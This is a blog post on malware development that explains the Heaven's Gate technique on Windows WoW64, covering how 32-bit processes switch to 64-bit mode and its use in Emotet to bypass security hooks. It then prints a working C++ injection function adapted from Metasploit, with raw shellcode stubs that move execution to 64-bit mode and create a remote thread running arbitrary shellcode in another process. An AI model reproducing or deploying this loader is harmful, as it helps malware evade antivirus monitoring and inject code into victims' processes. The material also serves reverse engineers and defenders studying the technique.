+++
title = 'Understanding Heaven Gate'
date = 2024-09-19T20:53:30+01:00
draft = false
showDate = true
toc = true
tags = ["evasion", "loader", "firststeps", "maldev"]
+++

# Heaven's gate lore
The Heaven's Gate tutorial was written by an anonymous hacker going online as Roy G. Biv, a member of a group called 29A. 
After the group disbanded and their e-zine's site went down, the Heaven's Gate technique was later [reprinted in the 2009 edition of the Valhalla hacker e-zine](https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT). I personally would check this resource, as it was the first time the technique was commented.
# Why does Heaven's gate exist?
In a normal environment, we have 64-bit Windows operative systems (or at least, we expect so). Some detection mechanisms, like antivirus software and OS security features, **do not detect a 32-bit process jumps from running 32-bit compatible code to 64-bit code.** And this is because a 32-bit program cannot inject code into 64-bit programs natively.
Indeed, 32-bit programs can run on a 64-bit OS because there is a compatibility layer: WoW64.
# The compatibility layer: WoW64
In a 64-bit Windows kernel, the first piece of code to execute in **any** process is **always** the 64-bit DLL called **ntdll.dll**, also called NTDLL.
This DLL takes care of **initializing the process in user-mode as a 64-bit process** and setting up the execution of the process. 

**But, what happens when a 64-bit Windows kernel runs a 32-bit process?** How does Windows allow that kind of compatibility?
Well, after NTDLL is loaded, the **Windows on Windows (WoW64)** interface takes over and **loads a 32-bit version of ntdll.dll, called ntdll32.dll**. After loading this DLL, the execution **turns into a 32-bit mode through a far jump to a compatibility code segment** that changes the processor context to work to 32 bits for this process. From now on, for that process, its environment (registers, instructions) is 32-bit. Nevertheless, the kernel is still 64 bit so, **when the process has to perform a syscall (and interact with the kernel space)** the 32-bit NTDLL that was loaded **changes the execution environment to 64-bit mode, executes the 64-bit syscall (calling the 64-bit NTDLL)**, and, once the *syscall* is performed ntdll32.dll returns the process to 32-bit mode. We can think of ntdll32.dll as a "proxy" so that the processor runs 32-bit code and 64-bit code when necessary (this is mainly when executing *syscalls*) in a 64-bit operative system.

This process is better described in [many](http://download.microsoft.com/download/3/a/9/3a9ad58f-5634-4cdd-8528-c78754d712e8/28-dw04040_winhec2004.ppt) [sources](https://msdn.microsoft.com/en-us/library/windows/desktop/aa384274(v=vs.85).aspx), including in the [Windows Internals books](https://www.safaribooksonline.com/library/view/windows-internals-fifth/9780735625303/ch03s08.html, so if you’re interested in reading more, you can do so, but I’ll try to do my best here.

# What is wrong with Heaven's Gate?
Besides the fact that this technique is pretty old (I think this is the [original post](https://github.com/darkspik3/Valhalla-ezines/blob/master/Valhalla%20%231/articles/HEAVEN.TXT) which has been since 2008), it has been used in a lot of malware campaigns, like [Emotet](https://blogs.blackberry.com/en/2023/01/emotet-returns-with-new-methods-of-evasion), a banking trojan. For example, the Emotet malware uses Heaven's Gate to perform process hollowing (another malware technique) **from a 32-bit process to a 64-bit process**.

**But why is this used?** Well, this technique is used to **bypass the WoW64 API hooks** performed by the security solutions. While a 32-bit process would normally **pass through the 32-bit API hooks** made by the 32-bit NTDLL.dll (which are the ones monitored by the security solutions), malicious programs can **perform a jump instruction past these hooks in order to execute 64-bit code** from a 32-bit process without having to trigger the API call, which is hooked by the security solutions. Overall, **this is used as an evasion mechanism.**

Windows initially developed this on the assumption that the 64-bit ntdll.dll could not be accessed by a 32-bit process, but Heaven’s Gate takes advantage of this by running x64 instructions which will be completely missed by any application expecting x86 instructions.

Also, this technique is used to difficult the analysis of the malware samples, as it makes the debugging and emulation harder (and the *reversing* process of these samples overall).
# Analyzing a Heaven's Gate implementatipn
There are a lot of different implementations of this technique, but they have 90% of the code in common. I will analyze the Heaven's Gate implementation used in the Metasploit Framework, as it is offered as a C++ function.

The Meterpreter shell [has a functionality to inject 64-bit code in 64-bit processes from 32-bit meterpreter shells](https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c). I use a slightly modified code to **perform the Heaven's Gate, call CreateRemoteThread with a 64-bit shellcode in order to inject 64-bit code from a 32-bit process to a 64-bit code**. My code is the following: 
```c++
// Definitions used for running native x64 code from a wow64 process
// (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h)
typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );

int InjectWOW64(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c

	LPVOID pRemoteCode = NULL;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;

/*
 A simple function to execute native x64 code from a wow64 (x86) process. 
 Can be called from C using the following prototype:
     typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );
 The native x64 function you specify must be in the following form (as well as being x64 code):
     typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );

 Original binary:
    src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/migrate/executex64.asm
	src: https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/migrate/remotethread.asm
*/
	BYTE sh_executex64[] =	"\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
							"\x58\x83\xC0\x2B\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
							"\x89\x02\xE8\x0F\x00\x00\x00\x66\x8C\xD8\x66\x8E\xD0\x83\xC4\x14"
							"\x5F\x5E\x5D\xC2\x08\x00\x8B\x3C\xE4\xFF\x2A\x48\x31\xC0\x57\xFF"
							"\xD6\x5F\x50\xC7\x44\x24\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C"
							"\x24";
	BYTE sh_wownativex[] = "\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
							"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
							"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
							"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
							"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
							"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
							"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
							"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
							"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
							"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
							"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
							"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
							"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
							"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
							"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
							"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
							"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
							"\x48\x83\xC4\x50\x48\x89\xFC\xC3";
							
	unsigned int sh_executex64_len = sizeof(sh_executex64);
	unsigned int sh_wownativex_len = sizeof(sh_wownativex);

	// inject payload into target process
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	printf("remcode = %p\n", pRemoteCode); getchar();
	
	// alloc a RW buffer in this process for the EXECUTEX64 function
	pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(sh_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
	// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
	pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	// printf("pExecuteX64 = %p ; pX64function = %p\n", pExecuteX64, pX64function); getchar();

	// copy over the wow64->x64 stub
	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
	VirtualAlloc( pExecuteX64, sizeof(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );

	// copy over the native x64 function
	memcpy( pX64function, sh_wownativex, sh_wownativex_len );

	// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
	VirtualAlloc( pX64function, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// set the context
	ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + sh_wownativex_len );

	ctx->h.hProcess       = hProc;
	ctx->s.lpStartAddress = pRemoteCode;
	ctx->p.lpParameter    = 0;
	ctx->t.hThread        = NULL;
	
	// run a new thread in target process
	pExecuteX64( pX64function, (DWORD)ctx );
	
	if( ctx->t.hThread ) {
		// if success, resume the thread -> execute payload
		ResumeThread(ctx->t.hThread);

		// cleanup in target process
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);

		return 0;
	}
	else
		return 1;
}
```

This function receives:
- The handle to the 64 bit process to inject the 64-bit shellcode.
- The 64-bit shellcode.
- The size of the shellcode.

Then, the steps to execute the 64-bit shellcode in the 64-bit target process are the following:
- Allocate memory space in the target process and copy the 64-bit shellcode for further execution.
- In the 32-bit process, a RW buffer is allocated for the EXECUTEX64 function. **This is the function that performs THE TRANSITION FROM 32-bit to 64-bit space, calls X64FUNCTION (we will see what this is in a moment) and returns from 64-bit to 32-bit space.**
- In the 32-bit process, a RW buffer is allocated for for the X64FUNCTION function (and its context). **This function is basically the 64-bit shellcode of CreateRemoteThread, as we want to create a thread in the remote process with our shellcode as the starting point.**.
- We change the memory properties of the X64FUNCTION function zone (the CreateRemoteThread) as it modifies itself during runtime.
- We run a new thread in the target process using the EXECUTE64 function, passing the address of the memory we allocated in the first step (therefore, pointing to the shellcode we want to execute).
- Resume the thread (the thread is created in suspended state, as the flag CREATE_SUSPENDED is used in the shellcode that runs the thread).
- Free the memory in the 32-bit process as it is no longer needed.

Note that we could **have a modified version of this function so that the 64-bit function that is executed is not CreateRemoteThread**, but a Windows API call (for example), or an arbitrary 64-bit function shellcode.